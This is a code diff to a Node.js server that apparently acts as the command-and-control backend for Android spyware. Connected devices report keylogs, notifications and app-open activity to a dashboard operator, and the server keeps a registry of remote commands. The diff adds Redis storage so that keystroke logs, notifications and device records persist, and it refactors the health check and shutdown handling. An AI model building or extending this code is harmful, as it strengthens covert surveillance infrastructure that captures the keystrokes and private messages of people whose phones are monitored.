@@ -19,6 +19,9 @@ const crypto   = require('crypto');
 const mongoose = require('mongoose');
 require('dotenv').config();
 
+// ── Redis ─────────────────────────────────────────────────────────────────────
+const R = require('./redis');
+
 // ============================================
 // CONFIG
 // ============================================
@@ -259,9 +262,13 @@ async function processMessage(clientId, clientType, event, data) {
                        androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name,
                        screenWidth: deviceInfo?.screenWidth, screenHeight: deviceInfo?.screenHeight };
         const existing = inMemoryDevices.get(deviceId) || {};
-        inMemoryDevices.set(deviceId, { ...existing, deviceId,
+        const deviceRecord = { ...existing, deviceId,
             deviceName: deviceInfo?.name || deviceId, deviceInfo: info,
-            isOnline: true, lastSeen: new Date() });
+            isOnline: true, lastSeen: new Date() };
+        inMemoryDevices.set(deviceId, deviceRecord);
+
+        // Persist to Redis
+        R.saveDevice(deviceId, deviceRecord).catch(() => {});
 
         // Persist / update (optional MongoDB)
         try {
@@ -315,6 +322,8 @@ async function processMessage(clientId, clientType, event, data) {
         // Update in-memory registry
         const existing = inMemoryDevices.get(deviceId);
         if (existing) inMemoryDevices.set(deviceId, { ...existing, isOnline: true, lastSeen: new Date() });
+        // Update Redis
+        R.markDeviceOnline(deviceId).catch(() => {});
         try { await Device.findOneAndUpdate({ deviceId }, { lastSeen: new Date(), isOnline: true }); } catch (e) {}
         broadcastDash('device:heartbeat', { deviceId, timestamp: new Date() });
         return;
@@ -332,7 +341,10 @@ async function processMessage(clientId, clientType, event, data) {
         if (conn) conn.lastPong = Date.now(); // keep live channel alive
         const deviceId = conn?.deviceId || data?.deviceId;
         if (deviceId) {
-            broadcastDash('keylog:push', { ...data, deviceId });
+            const entry = { ...data, deviceId, timestamp: data.timestamp || new Date().toISOString() };
+            broadcastDash('keylog:push', entry);
+            // Persist to Redis (non-blocking)
+            R.pushKeylog(deviceId, entry).catch(() => {});
         }
         return;
     }
@@ -350,6 +362,8 @@ async function processMessage(clientId, clientType, event, data) {
             list.unshift(entry);
             if (list.length > 200) list.pop();
             global.deviceNotifications.set(deviceId, list);
+            // Persist to Redis (non-blocking)
+            R.pushNotification(deviceId, entry).catch(() => {});
             broadcastDash('notification:push', entry);
         }
         return;
@@ -369,6 +383,8 @@ async function processMessage(clientId, clientType, event, data) {
                 list.unshift(entry);
                 if (list.length > 100) list.pop();
                 global.deviceActivity.set(deviceId, list);
+                // Persist to Redis (non-blocking)
+                R.pushActivity(deviceId, entry).catch(() => {});
                 broadcastDash('activity:app_open', entry);
             }
         }
@@ -573,6 +589,8 @@ const tcpServer = net.createServer((conn) => {
             } else {
                 // Primary channel disconnect — device is offline
                 deviceToTcp.delete(conn.deviceId);
+                // Update Redis
+                R.markDeviceOffline(conn.deviceId).catch(() => {});
                 try {
                     await Device.findOneAndUpdate({ deviceId: conn.deviceId },
                         { isOnline: false, lastSeen: new Date() });
@@ -670,17 +688,23 @@ app.post('/api/commands', async (req, res) => {
 
 app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));
 
-app.get('/api/health', (req, res) => res.json({
-    status: 'ok',
-    mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
-    tcpClients: tcpClients.size,
-    wsClients: wsClients.size,
-    connectedDevices: deviceToTcp.size,
-    pendingCommands: pendingCmds.size,
-    tcpPort: TCP_PORT,
-    httpPort: HTTP_PORT,
-    uptime: process.uptime()
-}));
+app.get('/api/health', async (req, res) => {
+    const redisStats = await R.getStats();
+    res.json({
+        status: 'ok',
+        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
+        redis: redisStats.connected
+            ? `connected (${redisStats.onlineDevices} online / ${redisStats.totalDevices} total devices, mem: ${redisStats.memoryUsed})`
+            : `disconnected${redisStats.error ? ' — ' + redisStats.error : ''}`,
+        tcpClients: tcpClients.size,
+        wsClients: wsClients.size,
+        connectedDevices: deviceToTcp.size,
+        pendingCommands: pendingCmds.size,
+        tcpPort: TCP_PORT,
+        httpPort: HTTP_PORT,
+        uptime: process.uptime()
+    });
+});
 
 app.get('/api/admin/users', async (req, res) => {
     try {
@@ -753,31 +777,27 @@ app.get('*', (req, res) => {
 // ============================================
 // DB HELPERS
 // ============================================
-async function broadcastDeviceList() {
+async function getDeviceList() {
+    // Priority: MongoDB → Redis → in-memory
     try {
-        const devices = await Device.find().sort({ lastSeen: -1 });
-        if (devices && devices.length > 0) {
-            broadcastDash('device:list', devices);
-        } else {
-            broadcastDash('device:list', Array.from(inMemoryDevices.values()));
-        }
-    } catch (e) {
-        broadcastDash('device:list', Array.from(inMemoryDevices.values()));
-    }
+        const dbDevices = await Device.find().sort({ lastSeen: -1 });
+        if (dbDevices && dbDevices.length > 0) return dbDevices;
+    } catch (_) {}
+    // Fallback: Redis
+    const redisDevices = await R.getAllDevices();
+    if (redisDevices.length > 0) return redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
+    // Final fallback: in-memory
+    return Array.from(inMemoryDevices.values());
+}
+
+async function broadcastDeviceList() {
+    const list = await getDeviceList();
+    broadcastDash('device:list', list);
 }
 
 async function sendDeviceListTo(ws) {
-    try {
-        const devices = await Device.find().sort({ lastSeen: -1 });
-        if (devices && devices.length > 0) {
-            wsSend(ws, 'device:list', devices);
-        } else {
-            // Fallback to in-memory registry
-            wsSend(ws, 'device:list', Array.from(inMemoryDevices.values()));
-        }
-    } catch (e) {
-        wsSend(ws, 'device:list', Array.from(inMemoryDevices.values()));
-    }
+    const list = await getDeviceList();
+    wsSend(ws, 'device:list', list);
 }
 
 // ============================================
@@ -854,16 +874,33 @@ server.on('error', (err) => {
     }
 });
 
-server.listen(HTTP_PORT, () => {
-    log('HTTP', `Server running on port ${HTTP_PORT}`);
-    log('HTTP', `Dashboard → ws://localhost:${HTTP_PORT}/ws`);
-    log('TCP',  `Android devices → localhost:${TCP_PORT}`);
+// Initialize Redis first, then start HTTP server
+R.init().then(() => {
+    server.listen(HTTP_PORT, () => {
+        log('HTTP', `Server running on port ${HTTP_PORT}`);
+        log('HTTP', `Dashboard → ws://localhost:${HTTP_PORT}/ws`);
+        log('TCP',  `Android devices → localhost:${TCP_PORT}`);
+        if (!process.env.REDIS_URL) {
+            log('REDIS', 'REDIS_URL not configured — skipping Redis (in-memory only)', 'warn');
+        }
+    });
+}).catch((err) => {
+    log('REDIS', `Init error: ${err.message} — starting without Redis`, 'warn');
+    server.listen(HTTP_PORT, () => {
+        log('HTTP', `Server running on port ${HTTP_PORT}`);
+        log('HTTP', `Dashboard → ws://localhost:${HTTP_PORT}/ws`);
+        log('TCP',  `Android devices → localhost:${TCP_PORT}`);
+    });
 });
 
-process.on('SIGINT', async () => {
-    log('SHUTDOWN', 'Closing...');
-    await mongoose.connection.close();
+async function gracefulShutdown(signal) {
+    log('SHUTDOWN', `${signal} received — closing…`);
+    try { await R.quit(); } catch (_) {}
+    try { await mongoose.connection.close(); } catch (_) {}
     process.exit(0);
-});
+}
+
+process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
+process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
 
 module.exports = { app, server, wss };
